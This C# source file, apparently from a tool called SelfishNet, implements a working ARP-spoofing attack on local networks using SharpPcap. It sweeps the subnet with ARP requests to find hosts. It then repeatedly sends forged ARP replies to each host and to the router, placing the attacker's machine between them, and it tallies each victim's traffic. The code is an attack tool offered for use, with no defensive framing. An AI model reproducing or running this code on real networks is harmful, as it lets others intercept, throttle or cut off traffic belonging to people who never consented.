using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using SharpPcap;
using SharpPcap.LibPcap;

namespace SelfishNet
{
    public class CArp : IDisposable
    {
        private volatile bool _isListeningArp;
        private volatile bool _isSpoofing;
        private volatile bool _isDiscovering;
        private volatile bool _isMonitoringTraffic;

        private PcList _pcList;
        private LibPcapLiveDevice _device;

        private Thread _arpListenerThread;
        private Thread _spoofingThread;
        private Thread _discoveringThread;
        private Thread _trafficMonitorThread;

        public byte[] LocalIp;
        public byte[] LocalMac;
        public byte[] RouterIp;
        public byte[] RouterMac;
        public byte[] BroadcastMac;

        /// <summary>Subnet mask detected from the interface (null if undetermined).</summary>
        public byte[] SubnetMask;

        /// <summary>Indicates whether the gateway was inferred (fallback) instead of detected.</summary>
        public bool IsGatewayInferred { get; private set; }

        public CArp(LibPcapLiveDevice nic, PcList pcList)
        {
            _pcList = pcList;
            _device = nic;

            if (!_device.Opened)
            {
                _device.Open(DeviceModes.Promiscuous, 1000);
            }

            LocalMac = _device.MacAddress.GetAddressBytes();

            // Detect IPv4 gateway
            foreach (var addr in _device.Interface.GatewayAddresses)
            {
                if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    RouterIp = addr.GetAddressBytes();
                    break;
                }
            }

            // Detect local IP and subnet mask
            foreach (var addr in _device.Addresses)
            {
                if (addr.Addr.ipAddress != null &&
                    addr.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    LocalIp = addr.Addr.ipAddress.GetAddressBytes();

                    if (addr.Netmask.ipAddress != null)
                    {
                        SubnetMask = addr.Netmask.ipAddress.GetAddressBytes();
                    }
                    break;
                }
            }

            // Fallback: assume /24 if mask not detected
            if (SubnetMask == null)
            {
                SubnetMask = new byte[] { 255, 255, 255, 0 };
                Console.WriteLine("[WARN] Subnet mask not detected, defaulting to /24.");
            }

            // Fallback: infer gateway as first host in range if not detected
            if (RouterIp == null && LocalIp != null)
            {
                byte[] networkAddr = GetNetworkAddress(LocalIp, SubnetMask);
                byte[] inferred = new byte[4];
                Array.Copy(networkAddr, inferred, 4);
                IncrementIP(inferred);
                RouterIp = inferred;
                IsGatewayInferred = true;
                Console.WriteLine($"[WARN] Gateway not detected, inferred as {new IPAddress(RouterIp)}");
            }

            BroadcastMac = new byte[] { 255, 255, 255, 255, 255, 255 };
        }

        // ──────────────────────────────────────────────
        //  ARP Listener
        // ──────────────────────────────────────────────

        public void StartArpListener()
        {
            if (!_isListeningArp)
            {
                _isListeningArp = true;
                _arpListenerThread = new Thread(ArpListenerLoop) { IsBackground = true };
                _arpListenerThread.Start();
            }
        }

        public void StopArpListener()
        {
            if (_isListeningArp)
            {
                _isListeningArp = false;
                _arpListenerThread?.Join(TimeSpan.FromSeconds(3));
                _arpListenerThread = null;
                Console.WriteLine("[INFO] ARP Listener stopped.");
            }
        }

        private void ArpListenerLoop()
        {
            _device.Filter = "arp";
            while (_isListeningArp)
            {
                PacketCapture pCapture;
                var status = _device.GetNextPacket(out pCapture);
                if (status != GetPacketStatus.PacketRead) continue;

                var rawPacket = pCapture.GetPacket().Data;
                if (rawPacket.Length < 42) continue;

                byte[] srcMac = new byte[6];
                Array.Copy(rawPacket, 6, srcMac, 0, 6);
                if (Tools.AreValuesEqual(srcMac, LocalMac)) continue;

                if (rawPacket[21] == 2)
                {
                    byte[] senderIp = new byte[4];
                    byte[] senderMac = new byte[6];
                    Array.Copy(rawPacket, 22, senderMac, 0, 6);
                    Array.Copy(rawPacket, 28, senderIp, 0, 4);

                    PC newPc = new PC();
                    newPc.Ip = new IPAddress(senderIp);
                    newPc.Mac = new PhysicalAddress(senderMac);
                    newPc.IsGateway = Tools.AreValuesEqual(senderIp, RouterIp);

                    newPc.Redirect = true;

                    if (newPc.IsGateway) RouterMac = senderMac;

                    if (_pcList.AddDevice(newPc))
                    {
                        Console.WriteLine($"[DETECTED] IP: {newPc.Ip} MAC: {newPc.Mac}");
                    }
                }
            }
        }

        // ──────────────────────────────────────────────
        //  ARP Discovery (Subnet-aware)
        // ──────────────────────────────────────────────

        public void StartArpDiscovery()
        {
            if (!_isDiscovering)
            {
                _isDiscovering = true;
                _discoveringThread = new Thread(DiscoveryLoop) { IsBackground = true };
                _discoveringThread.Start();
            }
        }

        public void StopDiscovery()
        {
            if (_isDiscovering)
            {
                _isDiscovering = false;
                _discoveringThread?.Join(TimeSpan.FromSeconds(3));
                _discoveringThread = null;
                Console.WriteLine("[INFO] Discovery stopped.");
            }
        }

        private void DiscoveryLoop()
        {
            // Discover gateway first (3 attempts)
            if (RouterIp != null)
            {
                for (int k = 0; k < 3; k++)
                {
                    SendArpRequest(new IPAddress(RouterIp));
                    Thread.Sleep(100);
                }
            }

            // Calculate network range based on real subnet mask
            byte[] networkAddr = GetNetworkAddress(LocalIp, SubnetMask);
            byte[] broadcastAddr = GetBroadcastAddress(LocalIp, SubnetMask);
            uint networkUint = BytesToUint(networkAddr);
            uint broadcastUint = BytesToUint(broadcastAddr);

            uint totalHosts = broadcastUint - networkUint - 1;
            uint maxHosts = Math.Min(totalHosts, 1024);

            Console.WriteLine($"[DISCOVERY] Network: {new IPAddress(networkAddr)} " +
                              $"Broadcast: {new IPAddress(broadcastAddr)} " +
                              $"Hosts to scan: {maxHosts}/{totalHosts}");

            for (uint offset = 1; offset <= maxHosts; offset++)
            {
                if (!_isDiscovering) break;

                uint targetUint = networkUint + offset;
                byte[] targetBytes = UintToBytes(targetUint);
                IPAddress target = new IPAddress(targetBytes);

                if (Tools.AreValuesEqual(targetBytes, LocalIp)) continue;
                if (RouterIp != null && Tools.AreValuesEqual(targetBytes, RouterIp)) continue;

                SendArpRequest(target);
                Thread.Sleep(10);
            }
            _isDiscovering = false;
        }

        // ──────────────────────────────────────────────
        //  ARP Spoofing
        // ──────────────────────────────────────────────

        public void StartSpoofing()
        {
            if (!_isSpoofing)
            {
                if (RouterMac == null)
                {
                    Console.WriteLine("[ERROR] Router MAC not found.");
                    return;
                }
                _isSpoofing = true;
                _spoofingThread = new Thread(SpoofLoop) { IsBackground = true };
                _spoofingThread.Start();
                Console.WriteLine(">>> ARP SPOOF STARTED <<<");
            }
        }

        public void StopSpoofing()
        {
            if (_isSpoofing)
            {
                _isSpoofing = false;
                _spoofingThread?.Join(TimeSpan.FromSeconds(5));
                _spoofingThread = null;
                Console.WriteLine(">>> ARP SPOOF STOPPED <<<");
            }
        }

        private void SpoofLoop()
        {
            while (_isSpoofing)
            {
                IReadOnlyList<PC> snapshot = _pcList.Devices;
                for (int i = 0; i < snapshot.Count; i++)
                {
                    if (!_isSpoofing) break;
                    PC target = snapshot[i];

                    if (target.IsLocalPc || target.IsGateway) continue;

                    if (target.Redirect)
                    {
                        SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
                                    LocalMac, RouterIp);

                        SendArpReply(RouterMac, RouterIp,
                                    LocalMac, target.Ip.GetAddressBytes());
                    }
                }
                Thread.Sleep(2000);
            }
        }

        // ──────────────────────────────────────────────
        //  Traffic Monitor
        // ──────────────────────────────────────────────

        /// <summary>
        /// Starts a background thread that captures IP traffic and updates
        /// byte counters per detected device in 1-second cycles.
        /// </summary>
        public void StartTrafficMonitor()
        {
            if (!_isMonitoringTraffic)
            {
                _isMonitoringTraffic = true;
                _trafficMonitorThread = new Thread(TrafficMonitorLoop) { IsBackground = true };
                _trafficMonitorThread.Start();
                Console.WriteLine("[INFO] Traffic monitor started.");
            }
        }

        public void StopTrafficMonitor()
        {
            if (_isMonitoringTraffic)
            {
                _isMonitoringTraffic = false;
                _trafficMonitorThread?.Join(TimeSpan.FromSeconds(3));
                _trafficMonitorThread = null;
                Console.WriteLine("[INFO] Traffic monitor stopped.");
            }
        }

        private void TrafficMonitorLoop()
        {
            try
            {
                while (_isMonitoringTraffic)
                {
                    IReadOnlyList<PC> snapshot = _pcList.Devices;
                    if (snapshot.Count == 0)
                    {
                        Thread.Sleep(1000);
                        continue;
                    }

                    // Reset counters for this cycle
                    foreach (PC pc in snapshot)
                    {
                        pc.BytesReceived = 0;
                        pc.BytesSent = 0;
                    }

                    // Capture for 1 second
                    DateTime cycleEnd = DateTime.Now.AddSeconds(1);
                    while (DateTime.Now < cycleEnd && _isMonitoringTraffic)
                    {
                        PacketCapture pCapture;
                        var status = _device.GetNextPacket(out pCapture);
                        if (status != GetPacketStatus.PacketRead) continue;

                        var raw = pCapture.GetPacket().Data;
                        if (raw.Length < 34) continue;

                        // Check for IP packet (EtherType 0x0800)
                        if (raw[12] != 0x08 || raw[13] != 0x00) continue;

                        byte[] srcIp = new byte[4];
                        byte[] dstIp = new byte[4];
                        Array.Copy(raw, 26, srcIp, 0, 4);
                        Array.Copy(raw, 30, dstIp, 0, 4);

                        int packetSize = raw.Length;

                        foreach (PC pc in snapshot)
                        {
                            byte[] pcIpBytes = pc.Ip.GetAddressBytes();
                            if (Tools.AreValuesEqual(pcIpBytes, srcIp))
                            {
                                pc.BytesSent += packetSize;
                            }
                            else if (Tools.AreValuesEqual(pcIpBytes, dstIp))
                            {
                                pc.BytesReceived += packetSize;
                            }
                        }
                    }

                    // Update speed display property
                    foreach (PC pc in snapshot)
                    {
                        double downloadKBs = pc.BytesReceived / 1024.0;
                        pc.DownloadSpeed = FormatSpeed(downloadKBs);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[TRAFFIC ERROR] {ex.Message}");
            }
        }

        private static string FormatSpeed(double kbs)
        {
            if (kbs < 0.1) return "0 KB/s";
            if (kbs >= 1024) return $"{kbs / 1024:F1} MB/s";
            return $"{kbs:F1} KB/s";
        }

        // ──────────────────────────────────────────────
        //  ARP Packet Construction
        // ──────────────────────────────────────────────

        public void SendArpRequest(IPAddress targetIp)
        {
            byte[] packet = BuildArpPacket(
                BroadcastMac, LocalMac, 1,
                LocalMac, LocalIp,
                new byte[6], targetIp.GetAddressBytes()
            );
            try
            {
                _device.SendPacket(packet);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ARP ERROR] SendArpRequest failed for {targetIp}: {ex.Message}");
            }
        }

        public void SendArpReply(byte[] destMac, byte[] destIp, byte[] srcMac, byte[] srcIp)
        {
            byte[] packet = BuildArpPacket(
                destMac, LocalMac, 2,
                srcMac, srcIp,
                destMac, destIp
            );
            try
            {
                _device.SendPacket(packet);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ARP ERROR] SendArpReply failed: {ex.Message}");
            }
        }

        public byte[] BuildArpPacket(byte[] destMac, byte[] srcMac, short arpType,
            byte[] arpSrcMac, byte[] arpSrcIp, byte[] arpDestMac, byte[] arpDestIp)
        {
            byte[] packet = new byte[42];
            Array.Copy(destMac, 0, packet, 0, 6);
            Array.Copy(srcMac, 0, packet, 6, 6);
            packet[12] = 8; packet[13] = 6;    // EtherType: ARP
            packet[14] = 0; packet[15] = 1;    // Hardware: Ethernet
            packet[16] = 8; packet[17] = 0;    // Protocol: IPv4
            packet[18] = 6; packet[19] = 4;    // HW size: 6, Proto size: 4
            packet[20] = 0; packet[21] = (byte)arpType;
            Array.Copy(arpSrcMac, 0, packet, 22, 6);
            Array.Copy(arpSrcIp, 0, packet, 28, 4);
            Array.Copy(arpDestMac, 0, packet, 32, 6);
            Array.Copy(arpDestIp, 0, packet, 38, 4);
            return packet;
        }

        // ──────────────────────────────────────────────
        //  Subnet Utilities (Cross-platform)
        // ──────────────────────────────────────────────

        /// <summary>Calculates network address: IP AND Mask.</summary>
        public static byte[] GetNetworkAddress(byte[] ip, byte[] mask)
        {
            byte[] result = new byte[4];
            for (int i = 0; i < 4; i++)
                result[i] = (byte)(ip[i] & mask[i]);
            return result;
        }

        /// <summary>Calculates broadcast address: IP OR ~Mask.</summary>
        public static byte[] GetBroadcastAddress(byte[] ip, byte[] mask)
        {
            byte[] result = new byte[4];
            for (int i = 0; i < 4; i++)
                result[i] = (byte)(ip[i] | ~mask[i]);
            return result;
        }

        private static uint BytesToUint(byte[] bytes)
        {
            return (uint)(bytes[0] << 24 | bytes[1] << 16 | bytes[2] << 8 | bytes[3]);
        }

        private static byte[] UintToBytes(uint value)
        {
            return new byte[]
            {
                (byte)(value >> 24),
                (byte)(value >> 16),
                (byte)(value >> 8),
                (byte)value
            };
        }

        private static void IncrementIP(byte[] ip)
        {
            for (int i = 3; i >= 0; i--)
            {
                if (ip[i] < 255) { ip[i]++; return; }
                ip[i] = 0;
            }
        }

        public void ClearDeviceList()
        {
            _pcList?.Clear();
        }

        public void Dispose()
        {
            _isListeningArp = false;
            _isDiscovering = false;
            _isSpoofing = false;
            _isMonitoringTraffic = false;

            _arpListenerThread?.Join(TimeSpan.FromSeconds(3));
            _discoveringThread?.Join(TimeSpan.FromSeconds(3));
            _spoofingThread?.Join(TimeSpan.FromSeconds(5));
            _trafficMonitorThread?.Join(TimeSpan.FromSeconds(3));

            _arpListenerThread = null;
            _discoveringThread = null;
            _spoofingThread = null;
            _trafficMonitorThread = null;

            try
            {
                if (_device != null && _device.Opened) _device.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DISPOSE] Error closing device: {ex.Message}");
            }
        }
    }
}